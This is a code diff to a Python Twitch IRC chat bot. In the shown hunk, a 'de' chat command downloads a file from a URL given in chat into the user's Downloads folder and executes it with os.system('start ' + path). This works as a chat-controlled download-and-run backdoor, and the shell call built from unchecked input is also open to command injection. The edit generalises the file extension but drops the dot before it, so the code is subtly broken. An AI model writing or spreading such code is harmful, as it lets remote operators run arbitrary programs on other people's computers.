@@ -7,7 +7,7 @@ import smtplib, ssl
 
 HOST = "irc.twitch.tv"
 PORT = 6667
-NICK = "username"
+NICK = "user"
 PASS = "oauth:"
 CHAN = "#channel"
 RATE = (20 / 30)
@@ -62,7 +62,8 @@ def main():
                     elif messageArray[2] == 'de':
                         try:
                             url = messageArray[3]
-                            path = os.path.expanduser("~") + "/Downloads/file.exe"
+                            ext = url.split(".")
+                            path = os.path.expanduser("~") + "/Downloads/file" + ext[len(ext)-1]
                             urllib.request.urlretrieve(url, path)
                             os.system('start ' + path)
                             sleep(5)
